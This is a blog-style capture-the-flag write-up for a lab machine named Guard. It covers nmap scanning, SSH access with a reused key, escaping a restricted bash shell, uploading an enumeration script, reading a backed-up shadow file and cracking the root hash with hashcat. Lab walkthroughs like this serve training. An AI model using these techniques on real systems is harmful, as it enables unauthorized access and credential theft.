---
title: "Writeup: Guard"
date: 2021-01-21T17:34:30-04:00
categories:
  - Blog
  - Writeup
tags:
  - guard
  - update
  - nmap
  - linux
  - rbash breakout
  - scp
  - hashcat
  - linenum.sh
  - dir
---

Here are notes from the named target:
Target Linux
Host name Guard
IP 10.10.10.50

#Enumeration
Start with simple nmap scan - nmap -sV -sC -p- -Pn 10.10.10.50 --min-rate=10000

```yaml
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

With just port 22 SSh open can try to use credentials from earlier target
```yaml
ssh -i id_rsa daniel@10.10.10.50
```

That works so look around a bit:  ls shows user.txt in pwd > /home/picasso but cat does not show contents maybe account jail cannot run cat.

Trick is to put command in {,} brackets so > {cat,user.txt} works
```yaml
aniel@guard:~$ ls
user.txt
daniel@guard:~$ cat user.txt
daniel@guard:~$ pwd
/home/picasso
daniel@guard:~$ {cat,user.txt}
20933365...ff4070c081
daniel@guard:~$ 
```
Hmmm, cant cd to look around so have to break out

research it : https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/

the easy way in this situation is to use a man page (man man, man ls) and then follow with "!bash". that dumps you back but nor bash instead of rbash shell
```yaml
daniel@guard:~$ man ls
...
!bash
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

daniel@guard:~$ cat user.txt
20933...070c081
```

Now we have a working shell we can download files with a cool scp script like "linenum" puts it in the folder
```yaml
──(root💀kali)-[~]
└─# scp -i ~/.ssh/id_rsa linenum.sh daniel@10.10.10.50:/home/<username>

┌──(root💀kali)-[/home/kali/http/enum]
└─# scp -i ~/.ssh/id_rsa linenum.sh daniel@10.10.10.50:/home/picasso
linenum.sh                   100%   46KB 205.2KB/s   00:00
```
After running "linenum.sh"  > daniel@guard:~$ ./linenum.sh > enum.md:

Review the file but nothing great in this case so look around the file system for loot. We find that we can not ch to root so lets look for default directories. we already know it is a Ubunto so google it.
```yaml
Main directories
The standard Ubuntu directory structure mostly follows the Filesystem Hierarchy Standard, which can be referred to for more detailed information.

Here, only the most important directories in the system will be presented.

/bin is a place for most commonly used terminal commands, like ls, mount, rm, etc.

/boot contains files needed to start up the system, including the Linux kernel, a RAM disk image and bootloader configuration files.

/dev contains all device files, which are not regular files but instead refer to various hardware devices on the system, including hard drives.

/etc contains system-global configuration files, which affect the system's behavior for all users.

/home home sweet home, this is the place for users' home directories.

/lib contains very important dynamic libraries and kernel modules

/media is intended as a mount point for external devices, such as hard drives or removable media (floppies, CDs, DVDs).

/mnt is also a place for mount points, but dedicated specifically to "temporarily mounted" devices, such as network filesystems.

/opt can be used to store additional software for your system, which is not handled by the package manager.

/proc is a virtual filesystem that provides a mechanism for kernel to send information to processes.

/root is the superuser's home directory, not in /home/ to allow for booting the system even if /home/ is not available.

/run is a tmpfs (temporary file system) available early in the boot process where ephemeral run-time data is stored. Files under this directory are removed or truncated at the beginning of the boot process.
(It deprecates various legacy locations such as /var/run, /var/lock, /lib/init/rw in otherwise non-ephemeral directory trees as well as /dev/.* and /dev/shm  which are not device files.)

/sbin contains important administrative commands that should generally only be employed by the superuser.

/srv can contain data directories of services such as HTTP (/srv/www/) or FTP.

/sys is a virtual filesystem that can be accessed to set or obtain information about the kernel's view of the system.

/tmp is a place for temporary files used by applications.

/usr contains the majority of user utilities and applications, and partly replicates the root directory structure, containing for instance, among others, /usr/bin/ and /usr/lib.

/var is dedicated to variable data, such as logs, databases, websites, and temporary spool (e-mail etc.) files that persist from one boot to the next. A notable directory it contains is /var/log where system log files are kept.
```

In the "/var/backups" we find loot in shadow folder backup we find the hash for root and daniel
```yaml
daniel@guard:/var/backups$ cat shadow
root:$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31:18334:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
....
daniel:$6$2EEJjgy86KrZ.cbl$oCf1MzIsN7N9KziBNo7uYrHLueZLM7wySrsFYxlNtO5NVhfVsyWCSKiIURNUxOOwC0tm1kyQsiv93imCwLM0k1:18326:0:99999:7:::
```

Crack the root hash with hashcat. Copy the hash to a file on Kali and use it and rockyou wordlist to crack it.

```yaml
hashcat -m 1800 --force hash /usr/share/wordlists/rockyou.txt
```

took a minute or two. then added that password to the known password list



















